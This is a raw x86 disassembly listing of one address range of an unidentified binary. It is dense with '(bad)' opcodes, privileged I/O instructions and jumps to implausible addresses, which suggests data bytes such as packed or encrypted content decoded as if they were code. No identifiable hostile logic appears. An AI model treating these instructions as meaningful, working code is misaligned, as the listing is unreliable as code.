  4253fb:	adc    BYTE PTR [edi],bh
  4253fd:	dec    eax
  4253fe:	mov    ds:0xb1d2e109,al
  425403:	jle    0x4253d4
  425405:	xchg   DWORD PTR [ebp+eax*2+0x300814ec],ebx
  42540c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42540d:	int3   
  42540e:	xor    cl,bl
  425410:	in     eax,0xc7
  425412:	int3   
  425413:	pop    edi
  425414:	sbb    ebp,ebp
  425416:	bound  eax,QWORD PTR [ecx+0x5c]
  425419:	xchg   edx,eax
  42541a:	push   es
  42541b:	aam    0xcd
  42541d:	out    0x0,al
  42541f:	jne    0x4253da
  425421:	rcr    BYTE PTR [edi+0x2a],1
  425424:	rcl    DWORD PTR [eax+0x5c17af83],1
  42542a:	mov    esi,0x24942e9f
  42542f:	stc    
  425430:	jo     0x4253bf
  425432:	clc    
  425433:	push   ss
  425434:	add    al,0x8e
  425436:	rol    BYTE PTR [edx],cl
  425438:	inc    esp
  425439:	jg     0x425458
  42543b:	mov    dl,0xe3
  42543d:	or     DWORD PTR [ebx+eax*4],eax
  425440:	rol    DWORD PTR [ecx],1
  425442:	ror    BYTE PTR [edi+0x52],0x57
  425446:	dec    edi
  425447:	data16 test BYTE PTR [ecx-0x46],ch
  42544b:	call   0xb2f9ac35
  425450:	in     eax,dx
  425451:	test   DWORD PTR [ebp+0x7f],ebp
  425454:	cmp    ebx,ecx
  425456:	ins    BYTE PTR es:[edi],dx
  425457:	or     dh,BYTE PTR [ecx]
  425459:	dec    edi
  42545a:	lods   eax,DWORD PTR ds:[esi]
  42545b:	addr16 jmp 0x4aec3025
  425461:	xor    eax,0x9f422733
  425466:	iret   
  425467:	(bad)  
  425468:	lea    ebx,[ebx+edi*8]
  42546b:	adc    DWORD PTR [ebx+0x33],ebp
  42546e:	push   ebx
  42546f:	addr16 lahf 
  425471:	scas   al,BYTE PTR es:[edi]
  425472:	push   esi
  425473:	adc    al,BYTE PTR [ebp+0x16c41ea9]
  425479:	inc    esi
  42547a:	je     0x42549e
  42547c:	xchg   esp,eax
  42547d:	and    al,0xd4
  42547f:	xor    eax,0x811e4f06
  425484:	inc    ebx
  425485:	pop    esi
  425486:	fs iret 
  425488:	and    BYTE PTR [ecx],ch
  42548a:	outs   dx,BYTE PTR ds:[esi]
  42548b:	xor    al,0x94
	...
  425499:	add    BYTE PTR [esi+edi*1+0x24],dl
  42549d:	sbb    DWORD PTR [esi+0x1b],ebp
  4254a0:	jge    0x425521
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	stos   DWORD PTR es:[edi],eax
  4254a7:	mov    ebp,0xcc4f50a7
  4254ac:	add    DWORD PTR [eax],eax
  4254ae:	sti    
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    BYTE PTR [eax-0x516c2e59],dl
  4254b7:	jns    0x4254e1
  4254b9:	and    eax,0xbae5f454
  4254be:	pop    es
  4254bf:	retf   0x80ca
  4254c2:	shl    DWORD PTR [esi+0x35],0x88
  4254c6:	nop
  4254c7:	and    al,0x1c
  4254c9:	aam    0x9e
  4254cb:	jp     0x425532
  4254cd:	jns    0x42545a
  4254cf:	mov    BYTE PTR [eax],ch
  4254d1:	add    al,0xac
  4254d3:	xchg   esp,eax
  4254d4:	stc    
  4254d5:	loop   0x4254cf
  4254d7:	loop   0x425525
  4254d9:	push   0xffffffb8
  4254db:	sbb    al,0x6a
  4254dd:	push   ebx
  4254de:	sub    edi,0xa7d1bd4d
  4254e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254e5:	arpl   dx,bp
  4254e7:	dec    edx
  4254e8:	or     ebp,DWORD PTR fs:[edx-0x476170a3]
  4254ef:	inc    ebp
  4254f0:	or     BYTE PTR [ecx+0x6c],al
  4254f3:	int3   
  4254f4:	xchg   edi,eax
  4254f5:	das    
  4254f6:	mov    edx,esi
  4254f8:	fcomp  QWORD PTR [ebx]
  4254fa:	jnp    0x425489
  4254fc:	sbb    ebx,esi
  4254fe:	stos   BYTE PTR es:[edi],al
  4254ff:	pop    edx
  425500:	repz test DWORD PTR [ebp+eiz*1-0x34],ecx
  425505:	jg     0x425559
  425507:	shl    DWORD PTR [esi+0x2ae39a5b],1
  42550d:	ror    DWORD PTR [esi+0x33519ef8],0x80
  425514:	aad    0x89
  425516:	push   ebx
  425517:	gs in  eax,0x66
  42551a:	xchg   ebx,eax
  42551b:	mov    esi,0xbf2c6d88
  425520:	outs   dx,BYTE PTR ds:[esi]
  425521:	ins    BYTE PTR es:[edi],dx
  425522:	jge    0x42552e
  425524:	fwait
  425525:	aas    
  425526:	sbb    eax,0x1e618d2a
  42552b:	sbb    al,0x1f
  42552d:	push   0xecaaf5b2
  425532:	cmp    al,0x1b
  425534:	cmp    al,0x16
  425536:	xor    BYTE PTR ds:0xbb12a7cd,dl
  42553c:	dec    ebx
  42553d:	jge    0x42558d
  42553f:	ins    BYTE PTR es:[edi],dx
  425540:	push   eax
  425541:	xchg   edi,eax
  425542:	or     DWORD PTR [edx+0x59753a38],edi
  425548:	dec    ebp
  425549:	shr    eax,0x85
  42554c:	xchg   ecx,eax
  42554d:	mov    edx,0xec6c07a8
  425552:	pop    ecx
  425553:	popa   
  425554:	mov    edi,0x5f6b2651
  425559:	hlt    
  42555a:	fs mov eax,0x31ed2495
  425560:	mov    ebx,DWORD PTR [esi]
  425562:	add    esi,eax
  425564:	inc    ebx
  425565:	push   edx
  425566:	jns    0x42558e
  425568:	je     0x42555a
  42556a:	sub    cl,ch
  42556c:	aam    0x95
  42556e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42556f:	adc    BYTE PTR [edx-0x3f],dh
  425572:	and    dh,BYTE PTR fs:[ebx+eiz*2-0x3d]
  425577:	ins    DWORD PTR es:[edi],dx
  425578:	cwde   
  425579:	gs (bad) 
  42557b:	xor    ch,bl
  42557d:	xchg   ebx,eax
  42557e:	call   0x81f9d4de
  425583:	add    ch,bh
  425585:	cmp    al,ch
  425587:	mov    esp,0x2c9d1ad4
  42558c:	mov    eax,ds:0xae0c59d7
  425591:	cmp    DWORD PTR [edi+0x562ebf07],ecx
  425597:	or     dh,BYTE PTR [edx-0x4a]
  42559a:	jge    0x4255c9
  42559c:	adc    esp,DWORD PTR [ebp-0x581a8cfa]
  4255a2:	test   esi,0x2afb88c6
  4255a8:	xchg   edx,eax
  4255a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255aa:	in     eax,dx
  4255ab:	mov    cl,0xa4
  4255ad:	scas   eax,DWORD PTR es:[edi]
  4255ae:	or     edi,DWORD PTR [ebx-0x32aaa02c]
  4255b4:	jl     0x42555a
  4255b6:	imul   esi,DWORD PTR [edx+eax*2-0x1af84ca0],0xf1146822
  4255c1:	call   0x416a5b0a
  4255c6:	into   
  4255c7:	adc    DWORD PTR [edx+edx*2+0x2a],ecx
  4255cb:	inc    ecx
  4255cc:	into   
  4255cd:	inc    ebp
  4255ce:	mov    dh,0x65
  4255d0:	sbb    eax,DWORD PTR [ecx]
  4255d2:	dec    edi
  4255d3:	sub    eax,0x5e59f35e
  4255d8:	je     0x425603
  4255da:	fmul   st(6),st
  4255dc:	mov    edx,0x213c55f9
  4255e1:	ins    DWORD PTR es:[edi],dx
  4255e2:	lods   eax,DWORD PTR ds:[esi]
  4255e3:	cs mov dh,0x33
  4255e6:	xor    ecx,edx
  4255e8:	adc    esi,ecx
  4255ea:	dec    esi
  4255eb:	sub    esp,edi
  4255ed:	mov    ch,0xdd
  4255ef:	mov    esp,0xa9522961
  4255f4:	cmp    BYTE PTR [ecx],dh
  4255f6:	push   0x3e046482
  4255fb:	inc    esp
  4255fc:	adc    al,0x9a
  4255fe:	jg     0x4255f5
  425600:	pop    esi
  425601:	lock rcr al,1
  425604:	outs   dx,DWORD PTR ds:[esi]
  425605:	stos   BYTE PTR es:[edi],al
  425606:	fstp   DWORD PTR [ebp-0xddc233f]
  42560c:	ret    
  42560d:	add    BYTE PTR [edi-0x50],ah
  425610:	push   ecx
  425611:	test   al,0x7d
  425613:	gs push cs
  425615:	icebp  
  425616:	and    DWORD PTR [edx],0x63
  425619:	push   esi
  42561a:	xor    al,BYTE PTR [esi+0x37]
  42561d:	das    
  42561e:	cvttps2pi mm0,QWORD PTR [eax]
  425621:	xchg   ebx,eax
  425622:	daa    
  425623:	(bad)  
  425624:	jmp    0x425601
  425626:	add    bl,BYTE PTR [ecx+0x15]
  425629:	jo     0x425654
  42562b:	xor    DWORD PTR [ebp+0x6c],0xffffff9e
  42562f:	dec    eax
  425630:	mov    eax,ds:0x5660a534
  425635:	in     eax,dx
  425636:	or     DWORD PTR ds:0x454c43dc,0xfffffff3
  42563d:	mov    eax,ds:0x7962e386
  425642:	pusha  
  425643:	pop    ecx
  425644:	seto   BYTE PTR [edx+0x7e2f60a4]
  42564b:	clc    
  42564c:	mov    BYTE PTR [eax],bh
  42564e:	and    edx,DWORD PTR [eax+0x4a]
  425651:	xor    BYTE PTR [esi],dh
  425653:	pop    eax
  425654:	sub    BYTE PTR [ebx],bl
  425656:	dec    esp
  425657:	add    eax,0xc032ff1a
  42565c:	push   esp
  42565d:	dec    ecx
  42565e:	scas   eax,DWORD PTR es:[edi]
  42565f:	int3   
  425660:	call   DWORD PTR ds:0x76de716e
  425666:	adc    esi,DWORD PTR [ebx+0x19]
  425669:	mov    ah,0xa1
  42566b:	dec    ebx
  42566c:	test   al,0xfd
  42566e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42566f:	test   esi,eax
  425671:	data16 sahf 
  425673:	jge    0x4255fe
  425675:	fwait
  425676:	mov    eax,0xdb85609
  42567b:	ins    DWORD PTR es:[edi],dx
  42567c:	mov    ch,dh
  42567e:	ja     0x4256fd
  425680:	inc    edx
  425681:	adc    al,0x9c
  425683:	sbb    esp,DWORD PTR [edx-0x2b]
  425686:	ins    DWORD PTR es:[edi],dx
  425687:	jbe    0x425643
  425689:	shl    DWORD PTR [eax],1
  42568b:	fisub  DWORD PTR [eax+edx*4-0x66]
  42568f:	dec    ecx
  425690:	or     DWORD PTR [edi+eax*1+0x2],esp
  425694:	and    eax,0x50bec52f
  425699:	inc    esp
  42569a:	or     BYTE PTR [edi-0x72],dh
  42569d:	xlat   BYTE PTR ds:[ebx]
  42569e:	test   eax,0xdc40d794
  4256a3:	xor    al,BYTE PTR [ebp-0x4a6c27e6]
  4256a9:	ja     0x425646
  4256ab:	dec    eax
  4256ac:	jmp    0x4256ae
	...
  4256ba:	mov    esi,0x74ef74ea
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	mov    eax,ds:0x4afc5ddb
  4256cb:	into   
  4256cc:	add    DWORD PTR [eax],eax
  4256ce:	sti    
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    dh,bl
  4256d3:	or     DWORD PTR [edi+ecx*2-0x1e],esp
  4256d7:	sahf   
  4256d8:	in     eax,dx
  4256d9:	xor    ah,BYTE PTR [eax+0x1c1664b4]
  4256df:	and    al,BYTE PTR [ebx+0x7e50eb1a]
  4256e5:	cmp    eax,0xe883a786
  4256ea:	mov    BYTE PTR [ebp+ebp*1-0x80],dl
  4256ee:	jb     0x42569c
  4256f0:	lock ficom WORD PTR [ebx+0x1f8a7db0]
  4256f7:	pop    esp
  4256f8:	jmp    0xcb62:0xb2a30113
  4256ff:	mov    edx,0xc6d5b527
  425704:	fst    QWORD PTR [ebx+eax*2]
  425707:	aas    
  425708:	aas    
  425709:	cmp    eax,0xaed6d95c
  42570e:	jp     0x42574a
  425710:	mov    eax,0xddb07a89
  425715:	out    0x61,eax
  425717:	pop    ebx
  425718:	in     eax,dx
  425719:	mov    WORD PTR [ecx-0x58],ds
  42571c:	fadd   QWORD PTR [edi+edi*1+0x658f55b1]
  425723:	lea    ebx,[ecx+0x11]
  425726:	cmp    BYTE PTR [esp+eax*8],bh
  425729:	and    BYTE PTR [edi+0x4bff8c8e],dl
  42572f:	ret    
  425730:	xchg   ebp,eax
  425731:	dec    ebx
  425732:	gs pop ebp
  425734:	les    ebp,FWORD PTR ds:0x805ac622
  42573a:	fwait
  42573b:	test   al,0x20
  42573d:	cmp    eax,esp
  42573f:	lahf   
  425740:	xchg   ecx,eax
  425741:	std    
  425742:	sub    BYTE PTR [ecx+0x16],bh
  425745:	push   esp
  425746:	stc    
  425747:	cmp    eax,0xe946b08f
  42574c:	loopne 0x42574e
  42574e:	lods   eax,DWORD PTR ds:[esi]
  42574f:	xchg   DWORD PTR [edi-0x7c],ecx
  425752:	xor    eax,0x656dc1b8
  425757:	jle    0x425712
  425759:	xor    ch,BYTE PTR [ebx+0x4e]
  42575c:	aaa    
  42575d:	ror    DWORD PTR [eax-0x4769f30e],0x68
  425764:	popa   
  425765:	in     al,0xf
  425767:	jb     0x42576a
  425769:	sub    DWORD PTR [ebx+0x103f29da],eax
  42576f:	and    eax,0x545f3bf9
  425774:	stos   BYTE PTR es:[edi],al
  425775:	iret   
  425776:	lds    esi,FWORD PTR [eax+0x31ac6dc4]
  42577c:	(bad)  
  42577d:	xchg   esp,eax
  42577e:	lods   eax,DWORD PTR ds:[esi]
  42577f:	inc    edx
  425780:	cmp    al,0xa2
  425782:	or     DWORD PTR [esi+ecx*8],ebx
  425785:	xchg   edi,eax
  425786:	outs   dx,DWORD PTR ds:[esi]
  425787:	jne    0x425786
  425789:	ret    0xaa9c
  42578c:	mov    BYTE PTR [eax-0x16453b43],cl
  425792:	mov    ds:0xfd55f4dd,eax
  425797:	mov    ebp,0xa50e7620
  42579c:	retf   
  42579d:	mov    ah,0x48
  42579f:	(bad)  
  4257a1:	dec    esi
  4257a2:	dec    esp
  4257a3:	pop    ecx
  4257a4:	loopne 0x4257cc
  4257a6:	cmp    DWORD PTR [eax-0x3f],ebp
  4257a9:	ss out 0x6f,al
  4257ac:	es pop edi
  4257ae:	adc    al,0x43
  4257b0:	xchg   esp,eax
  4257b1:	mov    ds:0xe4424b1d,al
  4257b6:	dec    ebx
  4257b7:	add    DWORD PTR [edi+0x6bd66fb0],ebp
  4257bd:	push   eax
  4257be:	jo     0x425758
  4257c0:	push   0xffffffed
  4257c2:	out    dx,al
  4257c3:	inc    ebp
  4257c4:	hlt    
  4257c5:	and    al,0x1
  4257c7:	and    bh,cl
  4257c9:	jae    0x425762
  4257cb:	mov    edx,0xc8a5159
  4257d0:	js     0x425789
  4257d2:	and    ebx,ebx
  4257d4:	dec    ebx
  4257d5:	(bad)  
  4257d6:	xor    al,0x88
  4257d8:	add    BYTE PTR [edi-0x3c26c9ce],0xde
  4257df:	xlat   BYTE PTR ds:[ebx]
  4257e0:	test   edx,edi
  4257e2:	fdivr  QWORD PTR [esi]
  4257e4:	call   0x9234:0x80777715
  4257eb:	cli    
  4257ec:	into   
  4257ed:	and    esi,esi
  4257ef:	sub    esp,DWORD PTR [ecx-0x5c]
  4257f2:	aas    
  4257f3:	jbe    0x42582f
  4257f5:	inc    edi
  4257f6:	dec    esi
  4257f7:	fbld   TBYTE PTR [edi]
  4257f9:	pop    esp
  4257fa:	jg     0x4257ea
  4257fc:	rol    esi,0xc0
  4257ff:	je     0x4257c1
  425801:	push   ds
  425802:	sub    DWORD PTR [eax],eax
  425804:	jbe    0x4257d9
  425806:	mov    ecx,0x670ef759
  42580b:	in     al,0xaa
  42580d:	push   0x29c33838
  425812:	and    DWORD PTR [eax],esi
  425814:	inc    ebx
  425815:	(bad)  
  425816:	shrd   ecx,ebx,0xc8
  42581a:	inc    edx
  42581b:	scas   al,BYTE PTR es:[edi]
  42581c:	pminub mm4,mm3
  42581f:	outs   dx,BYTE PTR ds:[esi]
  425820:	sub    DWORD PTR [ecx],edi
  425822:	or     al,0x76
  425824:	jo     0x4257d6
  425826:	add    al,0xaa
  425828:	cmp    al,0x0
  42582a:	imul   ecx,eax,0x78ab96e3
  425830:	or     al,0x5a
  425832:	pop    ecx
  425833:	(bad)  
  425834:	imul   ebp,DWORD PTR [ebp+ebp*8-0x7a246ae8],0x7bf7e777
  42583f:	mov    esi,DWORD PTR [ecx]
  425841:	jns    0x4258aa
  425843:	outs   dx,DWORD PTR ds:[esi]
  425844:	mov    esi,esp
  425846:	inc    ebx
  425847:	fimul  DWORD PTR [edx-0x57]
  42584a:	mov    ebx,0x20ecc46
  42584f:	cmp    eax,0x30d20a2
  425854:	es gs add esp,edx
  425858:	push   es
  425859:	sti    
  42585a:	dec    ebp
  42585b:	dec    ebp
  42585c:	mov    dh,0x63
  42585e:	cli    
  42585f:	xchg   BYTE PTR [ecx+0x50],cl
  425862:	xchg   esp,eax
  425863:	mov    DWORD PTR [eax+0x6f],ebp
  425866:	lods   eax,DWORD PTR ds:[esi]
  425867:	out    0x73,al
  425869:	pop    eax
  42586a:	ja     0x425855
  42586c:	cli    
  42586d:	scas   al,BYTE PTR es:[edi]
  42586e:	mov    al,ds:0x6ed3b9d1
  425873:	daa    
  425874:	cdq    
  425875:	push   ebp
  425876:	cmp    dh,al
  425878:	or     ebx,ebp
  42587a:	sub    DWORD PTR [edi-0x1763b3d1],eax
  425880:	or     DWORD PTR [eax+0x7f],ebp
  425883:	or     al,0xbd
  425885:	sti    
  425886:	jecxz  0x4258b1
  425888:	pop    esi
  425889:	ja     0x4258af
  42588b:	sub    cl,BYTE PTR [ecx-0x70860cff]
  425891:	test   ebx,esp
  425893:	push   ss
  425894:	fst    DWORD PTR [bp-0xbca]
  425899:	aaa    
  42589a:	out    dx,eax
  42589b:	into   
  42589c:	in     al,dx
  42589d:	test   DWORD PTR [ebx-0x5],eax
  4258a0:	(bad)  
  4258a1:	sbb    eax,0xa845ace7
  4258a6:	std    
  4258a7:	or     BYTE PTR [eax],dh
  4258a9:	sbb    BYTE PTR [esi+ebx*4+0x51],0x13
  4258ae:	outs   dx,DWORD PTR ds:[esi]
  4258af:	popf   
  4258b0:	das    
  4258b1:	cmp    al,0xab
  4258b3:	sub    DWORD PTR ds:0x5a2821a1,ebx
  4258b9:	jge    0x42592f
  4258bb:	data16 int 0xa4
  4258be:	push   ebp
  4258bf:	rcl    DWORD PTR [edx+0x69],cl
  4258c2:	mov    ds:0x832be62f,eax
  4258c7:	repnz in al,0xf8
  4258ca:	retf   0x1f5
	...
  4258d9:	add    BYTE PTR [ebx+0x45],cl
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	add    edi,ecx
  4258e8:	cmc    
  4258e9:	fild   WORD PTR [ebp-0x30]
  4258ec:	add    DWORD PTR [eax],eax
  4258ee:	sti    
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    BYTE PTR [edi],al
  4258f3:	popf   
  4258f4:	xchg   DWORD PTR [edi+eiz*2+0x4214966e],esp
  4258fb:	ja     0x42592b
  4258fd:	sub    ebp,esp
  4258ff:	fwait
  425900:	rcr    bl,1
  425902:	bound  ebx,QWORD PTR [esi-0x459cedcf]
  425908:	and    ax,WORD PTR [ebx-0x28634f46]
  42590f:	push   edx
  425910:	or     al,0xfd
  425912:	xor    eax,0x9df89d66
  425917:	mov    DWORD PTR [ecx+0x4ea99000],ecx
  42591d:	arpl   WORD PTR [ecx],dx
  42591f:	cmc    
  425920:	sbb    ebx,eax
  425922:	jge    0x425986
  425924:	mov    dh,0xc6
  425926:	sahf   
  425927:	push   ecx
  425928:	push   edi
  425929:	sar    BYTE PTR [eax+ecx*4],0xed
  42592d:	mov    dh,0x2b
  42592f:	test   al,0x8b
  425931:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425933:	ror    BYTE PTR [edi+0x52],1
  425936:	ins    BYTE PTR es:[edi],dx
  425937:	and    BYTE PTR [ebx+0x1c],bh
  42593a:	(bad)
  42593e:	jmp    0x4b674fe7
  425943:	outs   dx,DWORD PTR ds:[esi]
  425944:	cmp    eax,0xb1a0dc41
  425949:	jo     0x42595a
  42594b:	std    
  42594c:	mov    fs,WORD PTR [esi]
  42594e:	and    DWORD PTR [ebx],0x5c1b6d73
  425954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425955:	or     eax,0xc120df29
  42595a:	pop    esi
  42595b:	or     BYTE PTR ds:0xb4cf885b,bh
  425961:	xchg   ecx,eax
  425962:	xchg   edx,eax
  425963:	pop    edx
  425964:	fld    TBYTE PTR [ecx+0x61f1ec5d]
  42596a:	repz stc 
  42596c:	aaa    
  42596d:	fcomp  DWORD PTR [edi+0x7f0383e5]
  425973:	fld    st(3)
  425975:	shl    DWORD PTR [edi+0x6373db22],0xd4
  42597c:	xor    eax,0x4eab2b69
  425981:	sub    esp,DWORD PTR [ebx]
  425983:	and    al,BYTE PTR [edi+esi*2+0x37f11582]
  42598a:	outs   dx,BYTE PTR ds:[esi]
  42598b:	lods   al,BYTE PTR ds:[esi]
  42598c:	and    edi,DWORD PTR [ebp+0x2bd8fe54]
  425992:	not    ebx
  425994:	xor    al,0xcd
  425996:	int3   
  425997:	or     BYTE PTR [ebp-0x27],0x7f
  42599b:	cmp    bl,0x78
  42599e:	call   0xbfc52aeb
  4259a3:	xchg   DWORD PTR [ebx],edi
  4259a5:	into   
  4259a6:	call   0x301eb839
  4259ab:	hlt    
  4259ac:	(bad)  
  4259ad:	bound  eax,QWORD PTR [ebp-0x7342a42e]
  4259b3:	mov    gs,WORD PTR [esi+0x19]
  4259b6:	mov    bl,0x89
  4259b8:	cmp    bh,ah
  4259ba:	fcomp  QWORD PTR [edx+0x49]
  4259bd:	mov    cl,0x53
  4259bf:	cdq    
  4259c0:	and    dh,BYTE PTR [edx]
  4259c2:	jp     0x425992
  4259c4:	call   0xba277492
  4259c9:	mov    ebp,0xa9cdfdfa
  4259ce:	stos   DWORD PTR es:[edi],eax
  4259cf:	rol    DWORD PTR [edx+0x7a],1
  4259d2:	pop    ss
  4259d3:	xlat   BYTE PTR ds:[ebx]
  4259d4:	xchg   ebp,eax
  4259d5:	inc    ebp
  4259d6:	sbb    eax,0xe63e4454
  4259db:	test   bh,cl
  4259dd:	adc    DWORD PTR [ebx+esi*4+0x1],ecx
  4259e1:	fwait
  4259e2:	pop    esi
  4259e3:	sahf   
  4259e4:	xor    eax,0xf8a53d6
  4259e9:	lahf   
  4259ea:	mov    DWORD PTR [edx-0x7ed5e31f],edx
  4259f0:	jno    0x40ed469e
  4259f6:	aas    
  4259f7:	fsubp  st(0),st
  4259f9:	scas   al,BYTE PTR es:[edi]
  4259fa:	in     eax,0x54
  4259fc:	pop    eax
  4259fd:	fisubr WORD PTR [edx+0x4a789637]
  425a03:	inc    ecx
  425a04:	mov    BYTE PTR [esi],bh
  425a06:	aad    0x33
  425a08:	not    edx
  425a0a:	test   eax,0x75c9bfda
  425a0f:	or     eax,DWORD PTR [ebx+0x1b398cee]
  425a15:	jge    0x425999
  425a17:	stos   BYTE PTR es:[edi],al
  425a18:	js     0x425a0f
  425a1a:	nop
  425a1b:	(bad)  
  425a1c:	iret   
  425a1d:	sti    
  425a1e:	fstp   st(5)
  425a20:	xchg   ebp,eax
  425a21:	mov    al,0x71
  425a23:	and    cl,BYTE PTR [eax+0x1408686b]
  425a29:	adc    DWORD PTR [ebp+0x1e],ebp
  425a2c:	cmp    BYTE PTR [eax-0x630512b8],bl
  425a32:	ror    dh,cl
  425a34:	mov    ds:0xd7e87690,eax
  425a39:	inc    esi
  425a3a:	xchg   ecx,eax
  425a3b:	or     al,0xdf
  425a3d:	mov    bh,0xbe
  425a3f:	outs   dx,DWORD PTR ds:[esi]
  425a40:	jmp    DWORD PTR ds:0x4de8c7d5
  425a46:	stc    
  425a47:	inc    esi
  425a48:	(bad)  [edi-0x6]
  425a4b:	lods   eax,DWORD PTR ds:[esi]
  425a4c:	test   BYTE PTR ds:0x75fdc3fd,bl
  425a52:	outs   dx,BYTE PTR ds:[esi]
  425a53:	mov    esp,0x9c3c863d
  425a58:	jno    0x425ad9
  425a5a:	cs mov ecx,0x51490d79
  425a60:	out    dx,al
  425a61:	stos   BYTE PTR es:[edi],al
  425a62:	adc    DWORD PTR [ebp+0x7085ebfa],edi
  425a68:	and    edi,esi
  425a6a:	sub    eax,0x4ef8ec06
  425a6f:	jb     0x425a2c
  425a71:	retf   0x56d0
  425a74:	(bad)  
  425a75:	or     al,0x93
  425a77:	jne    0x425a2b
  425a79:	lods   eax,DWORD PTR ds:[esi]
  425a7a:	test   DWORD PTR [ebp-0x2ae32741],0xe6ad407b
  425a84:	popa   
  425a85:	push   ds
  425a86:	imul   esp,DWORD PTR es:[ebp+0x36899bf0],0xb
  425a8e:	clc    
  425a8f:	ins    DWORD PTR es:[edi],dx
  425a90:	push   0xffffffa6
  425a92:	in     eax,0x70
  425a94:	stc    
  425a95:	cmp    ah,dh
  425a97:	adc    eax,0xfe86ca9b
  425a9c:	sbb    al,0x26
  425a9e:	ret    0xfe14
  425aa1:	out    dx,eax
  425aa2:	jns    0x425a5b
  425aa4:	icebp  
  425aa5:	push   esp
  425aa6:	ins    BYTE PTR es:[edi],dx
  425aa7:	icebp  
  425aa8:	mov    esi,0xa429f08f
  425aad:	fsubrp st(3),st
  425aaf:	jg     0x425aa2
  425ab1:	cmp    eax,0x5f23f4b8
  425ab6:	stos   DWORD PTR es:[edi],eax
  425ab7:	add    DWORD PTR [edx],ebp
  425ab9:	call   0x4ced98d1
  425abe:	aaa    
  425abf:	dec    DWORD PTR [edi-0x2fc59d26]
  425ac5:	shr    BYTE PTR [edx-0x54c21515],1
  425acb:	fucomip st,st(5)
  425acd:	push   edx
  425ace:	hlt    
  425acf:	jnp    0x425a59
  425ad1:	pop    esi
  425ad2:	mov    edi,esi
  425ad4:	or     BYTE PTR [edi-0x8d645cd],dh
  425ada:	in     eax,dx
  425adb:	dec    edi
  425adc:	mov    cl,0x78
  425ade:	dec    ebp
  425adf:	push   cs
  425ae0:	push   0x7c55a0bf
  425ae5:	inc    ecx
  425ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ae7:	jae    0x425b4e
  425ae9:	call   0x9ccff9
	...
  425afa:	stos   BYTE PTR es:[edi],al
  425afb:	jo     0x425add
  425afd:	dec    ecx
  425afe:	cli    
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	imul   ebx,DWORD PTR [edi-0x63],0x1d2403d
  425b0d:	add    bl,bh
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    BYTE PTR [ecx+0x6b84df4b],ch
  425b17:	push   ebp
  425b18:	vpunpckhdq ymm2,ymm1,YMMWORD PTR [esi]
  425b1c:	and    ebp,ebx
  425b1e:	adc    BYTE PTR [eax],al
  425b20:	loop   0x425b6e
  425b22:	(bad)  
  425b23:	cs into 
  425b25:	mov    bh,0x18
  425b27:	outs   dx,DWORD PTR ds:[esi]
  425b28:	pop    ecx
  425b29:	jp     0x425b78
  425b2b:	mov    bh,0xa5
  425b2d:	xor    eax,0xe36c6606
  425b32:	dec    esi
  425b33:	(bad)  
  425b34:	cmp    ch,BYTE PTR [edx+0x1a]
  425b37:	inc    edi
  425b38:	cwde   
  425b39:	imul   DWORD PTR [esi-0x30]
  425b3c:	pop    ebx
  425b3d:	aaa    
  425b3e:	ins    BYTE PTR es:[edi],dx
  425b3f:	xor    eax,DWORD PTR [ebx]
  425b41:	cmp    dh,BYTE PTR [ecx]
  425b43:	pop    eax
  425b44:	mov    WORD PTR [ebp-0x3e23e990],?
  425b4a:	sbb    eax,0x8f33819d
  425b4f:	jmp    0x7486dfd1
  425b54:	(bad)  
  425b56:	xchg   BYTE PTR [esi+0x67],bh
  425b59:	(bad)
  425b5d:	and    eax,0x24ceb469
  425b62:	cmp    dl,ch
  425b64:	or     DWORD PTR [ecx],esi
  425b66:	mov    cl,0xf1
  425b68:	sbb    esi,esp
  425b6a:	int    0xd6
  425b6c:	test   al,0x6f
  425b6e:	mov    dh,0x26
  425b70:	pushf  
  425b71:	(bad)  
  425b72:	sbb    al,0x68
  425b74:	fimul  WORD PTR [esi+ebx*8]
  425b77:	mov    DWORD PTR [ecx],ecx
  425b79:	and    bl,BYTE PTR [ecx]
  425b7b:	xor    DWORD PTR [eax+0x33],eax
  425b7e:	fld    QWORD PTR [eax-0x2c3ce776]
  425b84:	sbb    BYTE PTR [eax-0x67550de1],bl
  425b8a:	dec    edx
  425b8b:	sar    BYTE PTR [eax-0x7e],0xdc
  425b8f:	sub    eax,0x5803a863
  425b94:	dec    edi
  425b95:	sbb    al,0x39
  425b97:	xchg   edi,eax
  425b98:	fsub   QWORD PTR [ebx]
  425b9a:	sti    
  425b9b:	in     eax,0x76
  425b9d:	sbb    eax,0xf89faa09
  425ba2:	js     0x425bae
  425ba4:	push   ebx
  425ba5:	and    BYTE PTR [edi+ecx*4+0x72],ch
  425ba9:	icebp  
  425baa:	shl    BYTE PTR [edx+eax*1+0x33],cl
  425bae:	or     al,0x36
  425bb0:	leave  
  425bb1:	or     dl,BYTE PTR [edi-0x2a]
  425bb4:	xchg   BYTE PTR [edi-0x1b],al
  425bb7:	sub    al,0xc7
  425bb9:	sti    
  425bba:	pop    esi
  425bbb:	sub    eax,0xec332d7c
  425bc0:	sub    DWORD PTR [ebx-0x5c],eax
  425bc3:	cmp    cl,BYTE PTR [ebx]
  425bc5:	mov    ah,0xa7
  425bc7:	repnz mov ch,0x93
  425bca:	xor    cl,0xeb
  425bcd:	pop    ss
  425bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425bcf:	adc    DWORD PTR [edx+esi*8],0x7251b7e9
  425bd6:	test   BYTE PTR [esi+0x6e6ea11f],dl
  425bdc:	jno    0x425c4e
